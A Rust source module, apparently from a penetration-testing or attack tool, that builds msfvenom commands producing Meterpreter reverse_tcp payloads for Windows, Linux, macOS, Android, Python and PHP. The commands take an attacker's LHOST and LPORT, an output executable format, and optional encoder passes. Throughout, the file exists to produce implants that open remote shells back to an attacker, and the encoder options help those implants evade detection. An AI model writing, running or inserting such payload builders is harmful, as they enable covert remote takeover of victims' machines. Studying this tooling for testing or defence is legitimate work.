use crate::models::PayloadRecipe;

pub const PLATFORM_PAYLOADS: &[(&str, &[(&str, &str)])] = &[
    (
        "windows",
        &[
            ("x86", "windows/meterpreter/reverse_tcp"),
            ("x64", "windows/x64/meterpreter/reverse_tcp"),
        ],
    ),
    (
        "linux",
        &[
            ("x86", "linux/x86/meterpreter/reverse_tcp"),
            ("x64", "linux/x64/meterpreter/reverse_tcp"),
        ],
    ),
    (
        "macos",
        &[
            ("x64", "osx/x64/meterpreter/reverse_tcp"),
            ("arm64", "osx/arm64/meterpreter/reverse_tcp"),
        ],
    ),
    ("android", &[("dalvik", "android/meterpreter/reverse_tcp")]),
    ("python", &[("py", "python/meterpreter/reverse_tcp")]),
    ("php", &[("php", "php/meterpreter/reverse_tcp")]),
];

pub fn build_recipe(
    platform: &str,
    arch: &str,
    lhost: &str,
    lport: u16,
    output_path: &str,
    encoder: Option<String>,
    iterations: Option<u32>,
) -> PayloadRecipe {
    let platform_lower = platform.to_lowercase();
    let arch_lower = arch.to_lowercase();

    let payload = PLATFORM_PAYLOADS
        .iter()
        .find(|(known_platform, _)| *known_platform == platform_lower)
        .and_then(|(_, arches)| {
            arches
                .iter()
                .find(|(known_arch, _)| *known_arch == arch_lower)
                .map(|(_, payload)| (*payload).to_string())
        })
        // Fallback for known platforms: use the first available payload
        .unwrap_or_else(|| {
            platform_fallback_payload(&platform_lower, &arch_lower)
        });

    let format = match platform_lower.as_str() {
        "windows" => "exe",
        "linux" => "elf",
        "macos" => "macho",
        "android" => "apk",
        "python" | "php" => "raw",
        _ => "raw",
    }
    .to_string();

    let output_file = if format == "raw" {
        if platform_lower == "python" {
            format!("{}.py", output_path)
        } else if platform_lower == "php" {
            format!("{}.php", output_path)
        } else {
            format!("{}.{}", output_path, format)
        }
    } else {
        format!("{}.{}", output_path, format)
    };

    let mut cmd_parts = vec![
        "msfvenom".to_string(),
        "-p".to_string(),
        payload,
        format!("LHOST={}", lhost),
        format!("LPORT={}", lport),
        "-f".to_string(),
        format.clone(),
        "-o".to_string(),
        output_file.clone(),
    ];

    if let Some(encoder) = encoder.as_ref() {
        cmd_parts.push("-e".to_string());
        cmd_parts.push(encoder.clone());
    }

    if let Some(iterations) = iterations {
        cmd_parts.push("-i".to_string());
        cmd_parts.push(iterations.to_string());
    }

    let command = cmd_parts.join(" ");

    PayloadRecipe {
        platform: platform_lower,
        architecture: arch_lower,
        lhost: lhost.to_string(),
        lport,
        format,
        output_path: output_file,
        encoder,
        iterations,
        command,
    }
}

fn platform_fallback_payload(platform: &str, arch: &str) -> String {
    match platform {
        "windows" => match arch {
            "x64" => "windows/x64/meterpreter/reverse_tcp",
            _ => "windows/meterpreter/reverse_tcp",
        },
        "linux" => match arch {
            "x64" => "linux/x64/meterpreter/reverse_tcp",
            _ => "linux/x86/meterpreter/reverse_tcp",
        },
        "macos" => "osx/x64/meterpreter/reverse_tcp",
        "android" => "android/meterpreter/reverse_tcp",
        "python" => "python/meterpreter/reverse_tcp",
        "php" => "php/meterpreter/reverse_tcp",
        _ => "generic/shell_reverse_tcp",
    }
    .to_string()
}

pub fn get_available_platforms() -> Vec<String> {
    PLATFORM_PAYLOADS
        .iter()
        .map(|(platform, _)| (*platform).to_string())
        .collect()
}

pub fn get_available_arches(platform: &str) -> Vec<String> {
    let platform_lower = platform.to_lowercase();
    PLATFORM_PAYLOADS
        .iter()
        .find(|(known_platform, _)| *known_platform == platform_lower)
        .map(|(_, arches)| arches.iter().map(|(arch, _)| (*arch).to_string()).collect())
        .unwrap_or_default()
}
